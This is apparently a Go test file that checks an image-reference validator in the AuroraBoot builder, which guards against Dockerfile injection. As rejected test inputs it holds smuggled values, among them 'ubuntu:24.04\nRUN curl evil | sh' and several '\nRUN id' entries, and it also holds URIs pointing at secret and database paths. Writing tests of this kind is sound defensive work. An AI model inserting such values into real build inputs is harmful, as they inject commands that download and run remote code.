package builder_test

import (
	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"

	"github.com/kairos-io/AuroraBoot/pkg/builder"
)

var _ = Describe("ValidateImageRef", func() {
	DescribeTable("accepts references a registry can serve",
		func(ref string) {
			Expect(builder.ValidateImageRef("base image", ref)).To(Succeed())
		},
		Entry("short name with tag", "ubuntu:24.04"),
		Entry("short name without tag", "ubuntu"),
		Entry("the official docker image, which looks like a scheme", "docker:24.0-dind"),
		Entry("fully qualified", "quay.io/kairos/kairos-init:v0.5.0"),
		Entry("registry with port", "localhost:5000/kairos/ubuntu:24.04"),
		Entry("digest", "quay.io/kairos/ubuntu@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"),
		Entry("tag and digest", "quay.io/kairos/ubuntu:24.04@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"),
	)

	DescribeTable("rejects anything that could change the Dockerfile it is written into",
		func(ref string) {
			err := builder.ValidateImageRef("base image", ref)
			Expect(err).To(HaveOccurred())
			Expect(err.Error()).To(ContainSubstring("base image"))
		},
		Entry("newline followed by an instruction", "ubuntu:24.04\nRUN curl evil | sh"),
		Entry("carriage return", "ubuntu:24.04\rRUN id"),
		Entry("trailing newline", "ubuntu:24.04\n"),
		Entry("space", "ubuntu:24.04 AS kairos-init"),
		Entry("tab", "ubuntu:24.04\tAS x"),
		Entry("NUL", "ubuntu:24.04\x00"),
		Entry("leading space", " ubuntu:24.04"),
		Entry("not a reference", "not a valid ref!"),
	)

	DescribeTable("rejects image-resolver URIs, which are not valid in a FROM line",
		func(ref string) {
			err := builder.ValidateImageRef("base image", ref)
			Expect(err).To(HaveOccurred())
			Expect(err.Error()).To(ContainSubstring("base image"))
		},
		Entry("oci scheme", "oci:quay.io/kairos/ubuntu:latest"),
		Entry("docker scheme", "docker:ubuntu:24.04"),
		Entry("docker scheme with slashes", "docker://quay.io/kairos/ubuntu:latest"),
		Entry("dir scheme", "dir:/var/lib/auroraboot/secrets"),
		Entry("file scheme", "file:///var/lib/auroraboot/auroraboot.db"),
		Entry("ocifile scheme", "ocifile:/tmp/image.tar"),
	)

	It("does not echo the rejected value, which may span several lines", func() {
		err := builder.ValidateImageRef("base image", "ubuntu\nRUN id")
		Expect(err).To(HaveOccurred())
		Expect(err.Error()).NotTo(ContainSubstring("\n"))
	})
})

var _ = Describe("BuildOptions.ValidateImageRefs", func() {
	It("accepts options with no image references", func() {
		Expect(builder.BuildOptions{}.ValidateImageRefs()).To(Succeed())
	})

	DescribeTable("rejects a tainted reference in any image field as invalid build options",
		func(opts builder.BuildOptions, field string) {
			err := opts.ValidateImageRefs()
			Expect(err).To(MatchError(builder.ErrInvalidBuildOptions))
			Expect(err.Error()).To(ContainSubstring(field))
		},
		Entry("BaseImage", builder.BuildOptions{BaseImage: "ubuntu\nRUN id"}, "base image"),
		Entry("Source.BaseImage", builder.BuildOptions{Source: builder.ImageSource{BaseImage: "ubuntu\nRUN id"}}, "base image"),
		Entry("KairosInitImage", builder.BuildOptions{KairosInitImage: "quay.io/kairos/kairos-init\nRUN id"}, "kairos-init image"),
		Entry("HadronBase", builder.BuildOptions{HadronBase: "quay.io/kairos/hadron\nRUN id"}, "hadron base"),
	)
})
